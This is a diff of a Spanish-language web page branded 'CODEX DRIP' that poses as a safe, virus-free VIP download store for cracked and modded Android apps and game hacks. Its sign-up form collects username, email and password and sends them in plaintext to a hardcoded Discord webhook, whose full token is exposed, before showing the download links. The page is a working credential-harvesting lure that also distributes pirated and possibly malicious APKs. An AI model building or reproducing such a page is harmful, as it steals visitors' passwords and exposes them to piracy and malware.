@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -10,7 +11,6 @@
         :root { --accent: #00f2ff; }
         * { font-family: 'Outfit', sans-serif; cursor: default; }
         
-        /* 1. FONDO ANIMADO */
         body {
             background: linear-gradient(-45deg, #030305, #0a0a1f, #160a2c, #030305);
             background-size: 400% 400%;
@@ -24,38 +24,31 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* 2. GLASSMORPHISM */
         .glass {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
         }
 
-        /* BOTÓN INTERACTIVO */
         .btn-premium {
             background: white;
             color: black;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         .btn-premium:hover {
-            transform: scale(1.05) translateY(-2px);
+            transform: scale(1.05);
             background: var(--accent);
             box-shadow: 0 0 25px rgba(0, 242, 255, 0.6);
         }
 
-        /* TARJETAS DE APKS */
         .apk-card {
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
         }
         .apk-card:hover {
-            transform: scale(1.02);
-            background: rgba(255, 255, 255, 0.07);
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+            border-color: var(--accent);
         }
-        .apk-card:active { transform: scale(0.98); }
 
         .loader {
             border: 3px solid rgba(255,255,255,0.1);
@@ -72,99 +65,59 @@
 
     <section id="auth-screen" class="w-full max-w-md">
         <div class="text-center mb-8">
-            <h1 class="text-5xl font-black tracking-tighter italic italic">CODEX <span class="text-[#00f2ff]">DRIP</span></h1>
+            <h1 class="text-5xl font-black italic tracking-tighter">CODEX <span class="text-[#00f2ff]">DRIP</span></h1>
             <p class="text-gray-400 text-xs tracking-[5px] mt-2">🛡️ SIN VIRUS | SEGURO</p>
         </div>
 
         <div class="glass p-8 rounded-[35px] relative">
             <div class="absolute -top-3 -right-3 bg-[#00f2ff] text-black text-[10px] font-bold px-3 py-1 rounded-full shadow-lg">👑 VIP ACCESS</div>
-            
-            <h2 class="text-2xl font-bold mb-6 text-center">CREAR CUENTA</h2>
-            
+            <h2 class="text-2xl font-bold mb-6 text-center text-white">CREAR CUENTA</h2>
             <div class="space-y-4">
-                <div class="relative">
-                    <span class="absolute left-4 top-4 opacity-40">👤</span>
-                    <input type="text" id="u" placeholder="Nombre de Usuario" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] transition-all">
-                </div>
-
-                <div class="relative">
-                    <span class="absolute left-4 top-4 opacity-40">📧</span>
-                    <input type="email" id="e" oninput="validarCorreo(this)" placeholder="Correo Electrónico" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none transition-all">
-                </div>
-
-                <div class="relative">
-                    <span class="absolute left-4 top-4 opacity-40">🔒</span>
-                    <input type="password" id="p" placeholder="Contraseña Maestra" class="w-full p-4 pl-12 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] transition-all">
-                </div>
-
-                <button onclick="enviarRegistro()" class="btn-premium w-full p-4 rounded-2xl font-black flex items-center justify-center gap-3 mt-4">
+                <input type="text" id="u" placeholder="Usuario" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
+                <input type="email" id="e" placeholder="Correo (@gmail, @hotmail...)" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
+                <input type="password" id="p" placeholder="Contraseña" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
+                <button onclick="enviarRegistro()" class="btn-premium w-full p-4 rounded-2xl font-black flex items-center justify-center gap-3">
                     <span id="btn-text">ACCESO INSTANTÁNEO</span>
                     <div id="loading" class="loader"></div>
                 </button>
-
-                <p id="msg" class="text-center text-xs font-bold text-gray-500 mt-4 h-4"></p>
-                
-                <div class="text-center pt-4 border-t border-white/5">
-                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">🔥 +500 usuarios activos ahora mismo</p>
-                </div>
+                <p id="msg" class="text-center text-[10px] text-gray-500 uppercase tracking-widest mt-4">🔥 +500 usuarios activos</p>
             </div>
         </div>
     </section>
 
     <section id="store-screen" class="hidden w-full max-w-2xl py-10">
         <div class="text-center mb-12">
-            <h1 class="text-5xl font-black italic">TODO <span class="text-[#00f2ff]">DESBLOQUEADO</span></h1>
-            <p class="text-gray-400 mt-2">Selecciona tu herramienta de poder</p>
+            <h1 class="text-5xl font-black italic">DRIP <span class="text-[#00f2ff]">STORE</span></h1>
+            <p class="text-gray-400 mt-2 tracking-[3px]">PREMIUM DOWNLOAD CENTER</p>
         </div>
 
-        <div class="mb-10">
-            <h3 class="text-[#00f2ff] font-bold text-xs tracking-widest mb-4 ml-2 uppercase">🛡️ EXPLOITS & HACKS</h3>
-            <div class="grid gap-4" id="grid-hacks"></div>
-        </div>
-
-        <div class="mb-10">
-            <h3 class="text-purple-400 font-bold text-xs tracking-widest mb-4 ml-2 uppercase">🎨 EDITORES & MULTIMEDIA</h3>
-            <div class="grid gap-4" id="grid-tools"></div>
-        </div>
+        <div class="grid gap-4" id="app-grid">
+            </div>
     </section>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
 
-        const hacks = [
-            { n: 'Delta Executor', d: 'Roblox Pro Menu', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', tag: 'NUEVO', c: 'blue' },
-            { n: 'GTA San Andreas', d: 'v2.11.277 Mod Menu', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', tag: 'VIP', c: 'green' }
+        const apps = [
+            { n: 'CAP CUT PRO', d: 'Editor VIP v14.7.0', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file?fbclid=IwY2xjawOmPtNleHRuA2FlbQIxMQBzcnRjBmFwcF9pZAwzNTA2ODU1MzE3MjgAAR5Z4krrda1eSlY8J4m9xL-jmITar9gRT9td4ugbfgm40EtN68mVYwcXCRyyNg_aem_pw8Ldoww20oUrXvPkiX4LA', t: 'ACTUALIZADO' },
+            { n: 'DELTA EXECUTOR', d: 'Roblox Android Menu', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', t: 'HACK' },
+            { n: 'DTW MOD MENU', d: 'Special Mod Menu v0909f6', i: '⚡', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file', t: 'HOT' },
+            { n: 'GTA SAN ANDREAS', d: 'v2.11.277 Full Game', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', t: 'JUEGO' },
+            { n: 'CANVA PRO', d: 'Diseño Premium Unlocked', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', t: 'PRO' },
+            { n: 'MINECRAFT APK', d: 'Última Versión Oficial', i: '🧱', l: 'https://mineckraftapk.com.mx/', t: 'POPULAR' },
+            // TUS DOS PRÓXIMAMENTE
+            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' },
+            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' }
         ];
-
-        const tools = [
-            { n: 'CapCut Pro', d: 'Premium Desbloqueado', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file', tag: 'ACTUALIZADO', c: 'purple' },
-            { n: 'Canva Pro', d: 'Todo Gratis', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', tag: 'VIP', c: 'pink' }
-        ];
-
-        // 5. VALIDACIÓN VISUAL EN TIEMPO REAL
-        function validarCorreo(input) {
-            const dominios = ["@gmail.com", "@hotmail.com", "@outlook.com", "@live.com"];
-            const esValido = dominios.some(d => input.value.toLowerCase().endsWith(d));
-            
-            if(input.value.length > 5) {
-                input.style.borderColor = esValido ? "#4ade80" : "#f87171";
-            } else {
-                input.style.borderColor = "rgba(255,255,255,0.1)";
-            }
-        }
 
         async function enviarRegistro() {
             const u = document.getElementById('u').value;
             const e = document.getElementById('e').value;
             const p = document.getElementById('p').value;
-            const loading = document.getElementById('loading');
-            const btnText = document.getElementById('btn-text');
-
             if(!u || !e || !p) return;
 
-            // 6. PANTALLA DE CARGA
-            loading.style.display = "block";
-            btnText.innerText = "PROCESANDO...";
+            document.getElementById('loading').style.display = "block";
+            document.getElementById('btn-text').innerText = "CONECTANDO...";
 
             try {
                 await fetch(WEBHOOK, {
@@ -172,7 +125,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "👑 NUEVO MIEMBRO VIP",
+                            title: "🚀 REGISTRO COMPLETADO",
                             color: 61951,
                             fields: [
                                 { name: "👤 User", value: u, inline: true },
@@ -183,28 +136,21 @@
                         }]
                     })
                 });
-
-                // Sonido de éxito (opcional, simulación)
-                setTimeout(abrirTienda, 800);
+                abrirTienda();
             } catch(err) {
-                btnText.innerText = "ERROR";
-                loading.style.display = "none";
+                alert("Error de conexión");
+                document.getElementById('loading').style.display = "none";
+                document.getElementById('btn-text').innerText = "REINTENTAR";
             }
         }
 
         function abrirTienda() {
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('store-screen').classList.remove('hidden');
-            
-            cargarCards(hacks, 'grid-hacks');
-            cargarCards(tools, 'grid-tools');
-        }
-
-        function cargarCards(lista, gridId) {
-            const grid = document.getElementById(gridId);
-            lista.forEach(app => {
+            const grid = document.getElementById('app-grid');
+            apps.forEach(app => {
                 grid.innerHTML += `
-                <div onclick="window.open('${app.l}')" class="apk-card glass p-5 rounded-3xl flex items-center justify-between cursor-pointer border border-white/5">
+                <div onclick="if('${app.l}'!=='#') window.open('${app.l}')" class="apk-card glass p-6 rounded-[30px] flex items-center justify-between cursor-pointer border border-white/5">
                     <div class="flex items-center gap-5">
                         <div class="text-3xl bg-black/40 w-16 h-16 flex items-center justify-center rounded-2xl shadow-inner border border-white/5">${app.i}</div>
                         <div>
@@ -212,10 +158,7 @@
                             <p class="text-xs text-gray-500">${app.d}</p>
                         </div>
                     </div>
-                    <div class="flex flex-col items-end gap-2">
-                        <span class="text-[9px] font-black bg-white/10 px-2 py-1 rounded-md tracking-tighter text-[#00f2ff]">${app.tag}</span>
-                        <div class="text-[10px] font-bold text-gray-600">FREE</div>
-                    </div>
+                    <span class="text-[9px] font-black bg-[#00f2ff]/10 px-2 py-1 rounded-md text-[#00f2ff] tracking-tighter">${app.t}</span>
                 </div>`;
             });
         }
